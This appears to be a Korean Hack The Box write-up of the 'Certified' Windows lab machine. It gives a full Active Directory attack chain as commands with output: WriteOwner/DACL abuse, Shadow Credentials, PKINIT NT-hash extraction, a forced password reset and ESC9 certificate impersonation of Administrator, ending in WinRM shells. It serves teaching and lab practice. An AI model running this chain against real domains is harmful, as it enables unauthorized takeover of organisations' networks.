---
title: "Certified (Medium)"
date: 2025-12-02
layout: single
excerpt: "Certified는 Medium 난이도의 Windows 머신이다. 도메인 열거 과정에서 judith.mader 계정이 MANAGEMENT 그룹에 대한 WriteOwner 권한을 가지고 있음이 확인된다. 해당 권한을 이용해 그룹의 소유자를 변경한 뒤, dacledit.py를 통해 MANAGEMENT 그룹의 권한을 수정한다. 이 그룹은 management_svc 계정에 대한 GenericWrite 권한을 가지고 있었으며, 이를 악용해 management_svc 계정으로의 인증이 가능해진다. 이후 Active Directory Certificate Services(ADCS) 구성을 조사한 결과, management_svc 계정이 ca_operator 계정에 대한 GenericAll 권한을 가지고 있었다. 이를 이용해 Shadow Credentials 기법을 수행하여 ca_operator 계정의 인증서를 생성하고, 이 계정으로 인증이 가능해진다. ca_operator로 ADCS 템플릿을 분석한 결과, CertifiedAuthentication 템플릿이 ESC9 취약점에 노출되어 있음이 확인된다. 이 취약점을 악용하여 ca_operator의 UPN을 Administrator로 변경한 뒤 인증서를 요청하면, 도메인 컨트롤러가 해당 인증서를 Administrator 계정의 인증서로 잘못 인식한다. 이 인증서를 통해 최종적으로 도메인 관리자 권한을 획득할 수 있다."
author_profile: true
toc: true
toc_label: "Certified"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-windows/certified/certified.png
  teaser_home_page: true
categories: [hackthebox-windows]
tags: [windows, active-directory, ldap, smb, winrm, bloodhound, impacket, certipy, pywhisker, pkinit, adcs, esc9, shadow-credentials, writeowner, genericwrite, genericall, priv-esc, kerberos, evil-winrm]


---

![Certified](/assets/htb-windows/certified/certified.png)

Certified는 Medium 난이도의 Windows 머신이다.  
도메인 열거 과정에서 `judith.mader` 계정이 **MANAGEMENT 그룹에 대한 WriteOwner 권한**을 가지고 있음이 확인된다.  
해당 권한을 이용해 그룹의 소유자를 변경한 뒤, `dacledit.py`를 통해 MANAGEMENT 그룹의 권한을 수정한다.  
이 그룹은 `management_svc` 계정에 대한 **GenericWrite 권한**을 가지고 있었으며,  
이를 악용해 `management_svc` 계정으로의 인증이 가능해진다.  

이후 Active Directory Certificate Services(ADCS) 구성을 조사한 결과,  
`management_svc` 계정이 `ca_operator` 계정에 대한 **GenericAll 권한**을 가지고 있었다.  
이를 이용해 **Shadow Credentials** 기법을 수행하여 `ca_operator` 계정의 인증서를 생성하고,  
이 계정으로 인증이 가능해진다.  

`ca_operator`로 ADCS 템플릿을 분석한 결과,  
**CertifiedAuthentication** 템플릿이 **ESC9 취약점**에 노출되어 있음이 확인된다.  
이 취약점을 악용하여 `ca_operator`의 UPN을 `Administrator`로 변경한 뒤 인증서를 요청하면,  
도메인 컨트롤러가 해당 인증서를 **Administrator 계정의 인증서**로 잘못 인식한다.  
이 인증서를 통해 최종적으로 **도메인 관리자 권한을 획득**할 수 있다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.67.119`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.67.119 | tee nmap               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 00:59 EST
Nmap scan report for 10.129.67.119
Host is up (0.20s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-02 05:59:21Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-12-02T06:00:47+00:00; 0s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-02T06:00:47+00:00; +1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-12-02T06:00:47+00:00; 0s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-12-02T06:00:47+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-02T06:00:08
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.63 seconds
```

Nmap 스캔 결과, `LDAP/LDAPS(389/636/3268/3269)`, `Kerberos(88)`, `SMB(445)`, `WinRM(5985)`, `DNS(53)`, `RPC(135)`, `NetBIOS(139)` 등의 서비스가 활성화되어 있다.

LDAP 서비스 정보를 통해 도메인 이름은 `certified.htb`, 호스트 이름은 `DC01` 임을 확인할 수 있다.

## Hosts file configuration

도메인 이름 `certified.htb` 및 호스트 이름 `DC01.certified.htb` 을 올바르게 해석하기 위해 `/etc/hosts` 파일에 **10.129.67.119 certified.htb DC01.certified.htb** 를 추가하였다.

```bash
$ cat /etc/hosts | grep certified

10.129.67.119   certified.htb   DC01.certified.htb
```

---

# Vulnerability Analysis

## LDAP Enumeration

> 머신에서 주어진 사용자의 자격 증명은 다음과 같다: (`judith.mader` / `judith09`)

위 자격 증명을 활용하여 LDAP로 접속해본 결과, 정상적으로 LDAP 접속이 가능함을 확인하였다:

```bash
$ nxc ldap certified.htb -u judith.mader -p judith09    

LDAP        10.129.67.119   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
LDAP        10.129.67.119   389    DC01             [+] certified.htb\judith.mader:judith09 
```

이후 [bloodhound-ce-python](https://www.kali.org/tools/bloodhound-ce-python/)을 통해 LDAP 기반 AD 구조 정보를 수집하였다:

```bash
$ bloodhound-ce-python -u judith.mader -p judith09 -c all -d certified.htb -ns 10.129.67.119 --zip

INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Done in 00M 29S
INFO: Compressing output into 20251202015050_bloodhound.zip
```

## Bloodhound (judith.mader User)

BloodHound 분석 결과, `judith.mader` 사용자 계정은 `MANAGEMENT` 그룹 객체에 대해 **WriteOwner** 권한을 보유하고 있는 것으로 확인되었다.  

또한 `MANAGEMENT` 그룹은 `management_svc` 사용자 객체에 대해 **GenericWrite** 권한을 가지고 있어, `MANAGEMENT` 그룹을 장악할 경우 `management_svc` 계정에 대한 속성 수정이 가능하다:

![블러드 하운드](/assets/htb-windows/certified/judith-bloodhound.png)

## WriteOwner Abuse

우선 `judith.mader` 계정이 보유한 **WriteOwner** 권한을 활용하여, [impacket](https://github.com/fortra/impacket/tree/master) 도구의 `owneredit.py` 스크립트를 사용해 `MANAGEMENT` 그룹 객체의 소유자를 `judith.mader` 로 변경하였다:

```bash
$ python3 owneredit.py -action write -new-owner judith.mader -target MANAGEMENT certified.htb/judith.mader:judith09

Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

변경 사항을 확인한 결과, 현재 `judith.mader` 사용자의 오브젝트 SID가 출력되어 있는 것으로 보아,  
`MANAGEMENT` 그룹 객체의 소유자가 `judith.mader` 로 성공적으로 변경된 것을 확인할 수 있다:

```bash
$ python3 owneredit.py -action read -target MANAGEMENT -dc-ip 10.129.67.119 certified.htb/judith.mader:judith09    

Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
```

소유권을 획득함으로써, 이후 해당 그룹 오브젝트에 대한 액세스 제어 목록(`DACL`) 수정 권한을 확보할 수 있게 된다.

이후 [impacket](https://github.com/fortra/impacket/tree/master) 도구의 `dacledit.py` 스크립트를 활용하여 `judith.mader` 계정에 **FullControl** 권한을 부여함으로써, 해당 그룹에 대한 전체 제어 권한을 획득하였다:

```bash
$ python3 dacledit.py -action write -rights FullControl -principal judith.mader -target MANAGEMENT certified.htb/judith.mader:judith09

Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251202-051228.bak
[*] DACL modified successfully!
```

현재 `judith.mader` 사용자는 `MANAGEMENT` 그룹 객체에 대해 **FullControl** 권한을 가지고 있으므로, 이를 활용하여 자신의 계정을 `MANAGEMENT` 그룹의 구성원으로 추가하는 명령을 실행하였다:

```bash
$ net rpc group addmem 'MANAGEMENT' judith.mader -U certified.htb/judith.mader%judith09 -S certified.htb
```

이후, `MANAGEMENT` 그룹 구성원을 조회하면 `judith.mader` 계정이 정상적으로 `MANAGEMENT` 그룹에 추가된 것을 확인할 수 있다:

```bash
$ net rpc group members 'MANAGEMENT' -U certified.htb/judith.mader%judith09 -S certified.htb

CERTIFIED\judith.mader
CERTIFIED\management_svc
```

## GenericWrite Abuse

`judith.mader` 계정은 `management_svc` 사용자 객체에 대해 **GenericWrite** 권한을 보유하고 있다.  

[pywhisker](https://github.com/ShutdownRepo/pywhisker) 도구를 사용하여 `management_svc` 계정의 `msDS-KeyCredentialLink` 속성에 인증 정보를 삽입하였다:

```bash
$ python3 pywhisker.py -d certified.htb -u judith.mader -p judith09 --target management_svc --action add

[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3012a909-36c6-8af1-cca0-b0baa8de1511
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 4sfabbOJ.pfx
/home/kali/htb/certified/pywhisker/pywhisker/pywhisker.py:54: CryptographyDeprecationWarning: Parsed a serial number which wasn't positive (i.e., it was negative or zero), which is disallowed by RFC 5280. Loading this certificate will cause an exception in a future release of cryptography.
  cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
[+] PFX exportiert nach: 4sfabbOJ.pfx
[i] Passwort für PFX: ot33mI7cvnWEYo2ixZpg
[+] Saved PFX (#PKCS12) certificate & key at path: 4sfabbOJ.pfx
[*] Must be used with password: ot33mI7cvnWEYo2ixZpg
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

이제, `pywhisker`를 통해 생성된 `.pfx` 인증서를 사용하여 `TGT` 를 발급받기 위해 [PKINITtools](https://github.com/dirkjanm/PKINITtools) 도구의 `gettgtpkinit.py` 스크립트를 활용하였다.

`TGT` 요청이 정상적으로 처리되기 위해서는 클라이언트와 도메인 컨트롤러(DC)의 시스템 시간이 일치해야 하므로, 먼저 `ntpdate` 명령어를 사용해 도메인 컨트롤러와 시간을 동기화하였다:

```bash
$ ntpdate 10.129.67.119 

2025-12-02 06:21:32.674161 (-0500) +1.497751 +/- 0.105703 10.129.67.119 s1 no-leap
CLOCK: time stepped by 1.497751
```

이후, `.pfx` 인증서와 암호를 사용해 `gettgtpkinit.py` 스크립트를 실행하여 `TGT` 를 성공적으로 발급받았다:

```bash
$ python3 gettgtpkinit.py -cert-pfx 4sfabbOJ.pfx -pfx-pass ot33mI7cvnWEYo2ixZpg -dc-ip 10.129.67.119 certified.htb/management_svc management_svc.ccache

2025-12-02 06:22:11,749 minikerberos INFO     Loading certificate and key from file
2025-12-02 06:22:11,765 minikerberos INFO     Requesting TGT
2025-12-02 06:22:19,554 minikerberos INFO     AS-REP encryption key (you might need this later):
2025-12-02 06:22:19,555 minikerberos INFO     48c556d6d7ee644deeaed182fc4df9c89fc82ba2e35e265edf574246f591d806
2025-12-02 06:22:19,559 minikerberos INFO     Saved TGT to file
```

이후, 발급받은 TGT(`.ccache`) 파일을 환경 변수에 적용한 뒤, [PKINITtools](https://github.com/dirkjanm/PKINITtools)에 포함된 `getnthash.py` 스크립트를 활용하여 `management_svc` 계정의 NT 해시를 추출하였다:

```bash
$ export KRB5CCNAME=$(pwd)/management_svc.ccache
```

```bash
$ python3 getnthash.py -dc-ip 10.129.67.119 certified.htb/management_svc -key 48c556d6d7ee644deeaed182fc4df9c89fc82ba2e35e265edf574246f591d806      

Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

---

# Exploitation

## Remote Shell via WinRM

획득한 `management_svc` 사용자의 NT 해시를 사용하여, `WinRM` 서비스를 통해 원격 접속이 가능한지 확인하였다:

```bash
$ nxc winrm certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584           

WINRM       10.129.67.119   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 

WINRM       10.129.67.119   5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)
```

해당 해시를 사용하여 인증에 성공했으며, `Evil-WinRM` 을 통해 대상 시스템에 원격으로 접속 결과 성공적으로 **management_svc 사용자의 PowerShell 세션을 획득**하였다: 

![management_svc 세션 획득](/assets/htb-windows/certified/svc-shell.png)

---

# Privilege Escalation

## Bloodhound (management_svc User)

Bloodhound 에선 `management_svc` 사용자 계정은 `ca_operator` 사용자 객체에 대한 **GenericAll** 권한을 보유하고 있다:

![블러드 하운드](/assets/htb-windows/certified/svc-bloodhound.png)

앞서 확인된 **GenericAll** 권한을 활용하여, `management_svc` 계정으로 `ca_operator` 계정의 비밀번호를 변경하였다:

```bash
$ net rpc password ca_operator 'Asdf1234@' -U certified.htb/management_svc%a091c1832bcdd4677c28b5a6a1295584 --pw-nt-hash -S certified.htb
```

비밀번호 변경이 완료된 이후, `ca_operator` 계정으로 LDAP 인증을 시도한 결과, 정상적으로 인증이 이루어졌다:

```bash
$ nxc ldap certified.htb -u ca_operator -p 'Asdf1234@'                

LDAP        10.129.67.119   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
LDAP        10.129.67.119   389    DC01             [+] certified.htb\ca_operator:Asdf1234@ 
```

## NT Hash Extraction for Administrator via TGT (ESC9 Abuse)

[Certipy](https://github.com/ly4k/Certipy) 도구를 활용하여 현재 AD CS 환경에 구성된 인증서 템플릿을 확인한 결과, **ESC9 취약점이 존재**함을 확인하였다.

```bash
$ certipy-ad find -u ca_operator@certified.htb -p "Asdf1234@" -dc-ip 10.129.67.119 -enabled -stdout     

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
# [SKIP]
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.

# ...
```

`CertifiedAuthentication` 템플릿이 다음과 같은 위험 요소를 포함하고 있는 것이 확인되었다:

```text
User Enrollable Principals      : CERTIFIED.HTB\operator ca
Vulnerabilities
    ESC9                        : Template has no security extension.
Remarks
    ESC9                        : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

이는 해당 템플릿에 보안 확장이 적용되어 있지 않기 때문에, 인증 요청 시 제공되는 **UPN 을 신뢰**하고 **SID 는 검증하지 않는 동작**을 유도할 수 있다.

이로 인해, 공격자는 UPN 필드에 `Administrator` 와 같은 UPN 값을 삽입하여, 해당 템플릿을 통해 `Administrator` 로 가장된 인증서를 발급받는 것이 가능하다.

우선, `management_svc` 계정이 보유한 **GenericAll** 권한을 활용하여, `ca_operator` 사용자의 UPN을 `Administrator` 로 변경하였다:

```bash
$ certipy-ad account -u management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.67.119 update 

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

변경에 성공하면, 현재 `ca_operator` 계정의 UPN은 `Administrator` 로 설정되어 있으며, 이는 인증서 템플릿 기준으로 해당 계정을 `Administrator` 로 인식하도록 유도할 수 있는 상태이다.

이후, `ca_operator` 계정으로 인증서를 요청하면, `Administrator` 로 설정된 `.pfx` 인증서 파일이 발급되는 것을 확인할 수 있다:

```bash
$ certipy-ad req -u ca_operator -p 'Asdf1234@' -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.67.119  

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

인증서를 발급받은 후, 이후 요청에서 UPN 충돌이 발생하지 않도록 하기 위해 `ca_operator` 계정의 UPN 값을 원래대로 복원해주었다:

```bash
$ certipy-ad account -username management_svc -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator -dc-ip 10.129.67.119 update

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator
[*] Successfully updated 'ca_operator'                                     
```

이후 [PKINITtools](https://github.com/dirkjanm/PKINITtools) 도구의 `gettgtpkinit.py` 스크립트를 활용하여 TGT 티켓 파일을 발급받았다 (동일한 작업은 `certipy auth`를 통해서도 가능하다.):

```bash
$ python3 gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass '' -dc-ip 10.129.67.119 certified.htb/administrator administrator.ccache

2025-12-02 13:43:32,710 minikerberos INFO     Loading certificate and key from file
2025-12-02 13:43:32,772 minikerberos INFO     Requesting TGT
2025-12-02 13:43:33,200 minikerberos INFO     AS-REP encryption key (you might need this later):
2025-12-02 13:43:33,201 minikerberos INFO     97ab8ef24284f5b9c0411098ee328d0cfad47d37df7f6847ca9078d62988c432
2025-12-02 13:43:33,207 minikerberos INFO     Saved TGT to file
```

Kerberos 환경 변수를 설정한 후, `getnthash.py` 스크립트를 통해 `Administrator` 사용자의 NT 해시를 추출하는 데 성공하였다:

```bash
$ export KRB5CCNAME=$(pwd)/administrator.ccache
```

```bash
$ python3 getnthash.py -key 97ab8ef24284f5b9c0411098ee328d0cfad47d37df7f6847ca9078d62988c432 -dc-ip 10.129.67.119 certified.htb/administrator

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
0d5b49608bbce1751f708748f67e2d34
```

## Remote Shell via WinRM (Administrator)

획득한 `Administrator` 사용자의 NT 해시를 사용하여, `WinRM` 서비스를 통해 원격 접속이 가능한지 확인하였다:

```bash
$ nxc winrm certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34    

WINRM       10.129.67.119   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 

WINRM       10.129.67.119   5985   DC01             [+] certified.htb\Administrator:0d5b49608bbce1751f708748f67e2d34 (Pwn3d!)
```

해당 해시를 사용하여 인증에 성공했으며, `Evil-WinRM` 을 통해 대상 시스템에 원격으로 접속 결과 성공적으로 **Administrator 사용자의 PowerShell 세션을 획득**하였다: 

![관리자 세션](/assets/htb-windows/certified/administrator-shell.png)

최종적으로 `root.txt` 파일을 읽어 플래그를 획득하였다.

![플래그](/assets/htb-windows/certified/flag.png)